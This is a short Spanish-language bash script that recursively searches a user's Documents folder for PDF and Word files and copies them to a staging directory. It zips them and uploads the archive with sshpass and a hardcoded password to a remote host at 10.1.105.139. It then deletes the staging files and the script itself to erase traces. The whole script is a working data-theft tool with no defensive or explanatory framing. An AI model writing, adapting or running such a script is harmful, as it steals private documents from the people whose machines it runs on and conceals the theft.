#!bin/bash

buscar_y_robar(){
	shopt -s nullglob dotglob
	for pathname in "$1"/*;do
		if [ -d "$pathname" ]; then
			printf '====ENTRANDO A %s===\n\n' "$pathname"
			buscar_y_robar "$pathname"
		else
			case "$pathname" in
				*.pdf)
					printf '==>PROCEDO A LA ROBASION DE %s\n' "$pathname"
					cp "$pathname" ~/robasion
				;;
				*.doc|*.docx)
					printf '==>PROCEDO A LA ROBACION DE %s\n' "$pathname"
					cp "$pathname" ~/robasion
				;;
				*)
				;;
			esac
		fi
	done

}

mkdir ~/robasion
DOC=~/Documents
buscar_y_robar "$DOC"
zip -r ~/robo.zip ~/robasion
sshpass -p 'plicky01' scp ~/robo.zip benqui@10.1.105.139:~/pato
rm -r ~/robasion
rm ~/robo.zip
rm ~/robo.sh
exit
